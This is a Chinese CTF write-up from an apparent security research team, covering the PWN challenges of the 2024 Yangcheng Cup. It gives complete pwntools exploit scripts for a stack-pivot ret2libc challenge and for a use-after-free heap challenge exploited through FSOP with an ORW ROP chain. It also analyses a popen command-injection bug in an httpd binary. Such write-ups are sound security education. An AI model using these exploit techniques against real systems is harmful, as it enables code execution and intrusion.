---
title: 2024年羊城杯粤港澳大湾区网络安全大赛WP-PWN AK篇
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247507954&idx=1&sn=5517955784fceb19732a5f862aeb044d&chksm=fa520a4ccd25835a2925fd3116fe8f88f1358f746019a40e6de08496841c517a88f313b425b9&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-09-04
fetch_date: 2025-10-06T18:28:53.882198
---

# 2024年羊城杯粤港澳大湾区网络安全大赛WP-PWN AK篇

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSQUzBxicrciaib10gwaYy2QS1fKO8iaWPOzeA1LaKqbzYd6V3u5DsrFRu98Cf5xA9NkM0StjeWgP8Ybw/0?wx_fmt=jpeg)

# 2024年羊城杯粤港澳大湾区网络安全大赛WP-PWN AK篇

原创

NEURON

山石网科安全技术研究院

## pstack

溢出0x10个字节，控制rbp，返回这个位置，读rop链到bss段，走ret2libc。

```
.text:00000000004006BF                 call    puts
.text:00000000004006C4                 lea     rax, [rbp+buf]
.text:00000000004006C8                 mov     edx, 40h ; '@'  ; nbytes
.text:00000000004006CD                 mov     rsi, rax        ; buf
.text:00000000004006D0                 mov     edi, 0          ; fd
.text:00000000004006D5                 call    read
.text:00000000004006DA                 nop
.text:00000000004006DB                 leave
.text:00000000004006DC                 retn
;控制rbp即可控制写入位置
```

```
from pwn import *
#from Crypto.Util.number import bytes_to_long,bytes_to_long
#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')
li = lambda content,data : print('\x1b[01;38;5;214m' + content + ' = ' + hex(data) + '\x1b[0m')
lg = lambda content : print('\x1b[01;38;5;214m' + content +'\x1b[0m')
sla = lambda data, content: io.sendlineafter(data,content)
sa = lambda data, content: io.sendafter(data,content)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rl = lambda data: io.recvuntil(data)
re = lambda data: io.recv(data)
sa = lambda data, content: io.sendafter(data,content)
dbg = lambda    : gdb.attach(io)
bk = lambda : (dbg(),pause())
inter = lambda: io.interactive()
l64 = lambda    :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda     :u64(io.recv(6).ljust(8,b'\x00'))
add=0
orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1,add, 0x30))
def dbg(c = 0):
    if(c):
        gdb.attach(io, c)
        pause()
    else:
        gdb.attach(io)
        pause()
#---------------------------------------------------------
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF("/home/ly/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
#libc=ELF("/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
filename = "./pwn"
io = process(filename)
elf = ELF(filename)
#---------------------------------------------------------
pop_rdi = 0x0000000000400773
ret = pop_rdi+1
pop_rsi = 0x0000000000400771 #pop rsi ; pop r15 ; ret
leave_ret = 0x00000000004006db
bss =elf.bss()+0x300
main_no_rbp =
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

payload=b'a'*0x30+p64(bss)+p64(0x4006C4)
sla(b"?\n", payload)

payload=p64(bss+0x500)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4006C4)
payload=payload.ljust(0x30,b'\x00')
payload+=p64(bss-0x30)+p64(leave_ret)
s(payload)
libc_addr=u64(io.recv(6).ljust(8,b"\x00"))-libc.sym['puts']
lg(hex(libc_addr))

libc.address=libc_addr
system=libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\0'))
ogg=libc.address+0xebd43

payload=p64(bss)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)
payload=payload.ljust(0x30,b'\x00')
payload+=p64(bss+0x500-0x10-0x20)
payload+=p64(leave)

s(payload)
inter()
```

## TravelGraph

uaf导致堆溢出写漏洞，堆风水之后走apple的orw得到flag。

```
from pwn import *
from Crypto.Util.number import bytes_to_long, bytes_to_long

# --------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')
li = lambda content, data: print('\x1b[01;38;5;214m' + content + ' = ' + hex(data) + '\x1b[0m')
lg = lambda content: print('\x1b[01;38;5;214m' + content + '\x1b[0m')
sla = lambda data, content: io.sendlineafter(data, content)
sa = lambda data, content: io.sendafter(data, content)
sl = lambda data: io.sendline(data)
rl = lambda data: io.recvuntil(data)
re = lambda data: io.recv(data)
dbg = lambda: gdb.attach(io)
bk = lambda: (dbg(), pause())
inter = lambda: io.interactive()
l64 = lambda: u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
h64 = lambda: u64(io.recv(6).ljust(8, b'\x00'))
add = 0
orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1, add, 0x30))

def dbg(c=0):
    if c:
        gdb.attach(io, c)
        pause()
    else:
        gdb.attach(io)
        pause()

# ---------------------------------------------------------
libc = ELF('./libc.so.6')
filename = "./pwn"
io = process(filename)
elf = ELF(filename)
# ---------------------------------------------------------

g = 'guangzhou'
n = 'nanning'
c = 'changsha'
d = 'nanchang'
f = 'fuzhou'

def add(type, A, B, content):
    sla(".", '1')
    if type == 0:
        sla("?", "car")
    elif type == 1:
        sla("?", "train")
    elif type == 2:
        sla("?", "plane")

    sla("?", A)
    sla("?", B)
    sla("?", '1000')
    sla(":", content)

def free(A, B):
    sla("5. Calculate the distance.", '2')
    sla("?", A)
    sla("?", B)

def show(A, B):
    sla("5. Calculate the distance.", '3')
    sla("?", A)
    sla("?", B)

def edit(A, B, idx, far, content):
    sla("5. Calculate the distance.", '4')
    sla("?", A)
    sla("?", B)
    sla("?", str(idx))
    sla("?", far)
    sa(":", content)

def calc(A):
    sla("5. Calculate the distance.", '5')
    sla("?", A)

add(0, g, n, "a"*4)
add(2, n, c, "a"*4)
add(1, c, d, "a"*4)

calc(d)
free(g, n)
add(2, f, d, "AAAA")

add(0, g, n, "\x70")
show(g, n)
rl("Note:")
heap = h64() - 0x1470
print(hex(heap))

free(n, c)
free(g, n)

add(2, n, c, "A" * 0x510)
show(n, c)
libc.address = l64()- 0x219ce0 - 0x1000
print(hex(libc.address))
free(n, c)
free(f, d)

payload = b"A" * 0x510 + p32(3) + p32(4) + p64(3)
add(2, n, c, payload)

free(c, d)

add(1, c, d, "AAAA")
add(2, f, d, "AAAA")
add(0, g, n, "AAAA")

free(c, d)
add(2, f, d, "AAAA")
free(g, n)

#apple   ->orw
fd = libc.address + 0x21b110
chunk = 0x19b0 + heap
FP = heap + 0x19b0
A = FP + 0x100
B = A + 0xe0 - 0x60
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']

pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx_12 = 0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
ret = 0x0000000000029139 + libc.address
setcontext = libc.sym['setcontext']
ROP_addr = FP + 0x400 + 0x30
payload = (0xa0 - 0x10) * b"\x00" + p64(A)  #
payload = payload.ljust(0xb0, b"\x00") + p64(1)
payload = payload.ljust(0xc8, b"\x00") + p64(_IO_wfile_jumps - 0x40)
payload = payload.ljust(0x190, b"\x00") + p64(ROP_addr) + p64(ret)
sla("5. Calculate the distance.", '4')
sla("?", f)
sla("?", d)
sla("?", str(0))
sla("?", str(0x41414141))

orw = b"\x00" * (0x410 - 0x1d0) + p64(pop_rdi) + p64(heap + 0x1e80 - 8) + p64(pop_rsi) + p64(0) + p64(pop_rdx_12) + p64(0) * 2 + p64(libc.sym['open'])
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(FP + 0x700) + p64(pop_rdx_12) + p64(0x30) * 2 + p64(libc.sym['read'])
orw += p64(pop_rdi) + p64(1) + p64(libc.sym['write']) + b"/flag\x00"
sa(":", p64(0) + p64(0x531) + p64(fd) * 2 + p64(chunk) + p64(libc.sym['_IO_list_all'] - 0x20) + payload[0x20:] + orw)

add(2, f, d, "AAAA")
add(0, g, n, payload[0x10:])
# gdb.attach(p,"")
# sleep(2)
sla("5. Calculate the distance.", '4')
inter()
```

## httpd

popen函数存在命令注入漏洞。

```
  sub_25DE(v35, v35);
  if ( !*haystack )
    haystack = "./";
  v18 = strlen(haystack);
  if ( *haystack == 47
    || !strcmp(haystack, "..")
    || !strncmp(haystack, "../", 3u)
    || strstr(haystack, "/../")
    || !strcmp(&haystack[v18 - 3], "/..") )
  {
    sub_233E(400, (int)"Bad Request", 0, "Illegal filename.");
  }
  if ( !sub_1F74(haystack) )
    sub_233E(404, (int)"Not Found", 0, "Invalid file name.");
  v1 = fileno(stdout);
  fd = dup(v1);
  v2 = fileno(stderr);
  v22 = dup(v2);
  freopen("/dev/null", "w", stdout);
  freopen("/dev/null", "w", stderr);
  stream = popen(haystack, modes);//存在命令注入漏洞
  if ( stream )
  {
    pclose(stream);
    v4 = fileno(stdout);
    dup2(fd, v4);
    v5 = fileno(stderr);
    dup2(v22, v5);
    close(fd);
    close(v22);
    if ( stat(haystack, &v27) < 0 )
```

会有一个url解码，需要对命令先url编码一下，特别是'/'等符号。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSQUzBxicrciaib10gwaYy2QS12BCAILoMDR...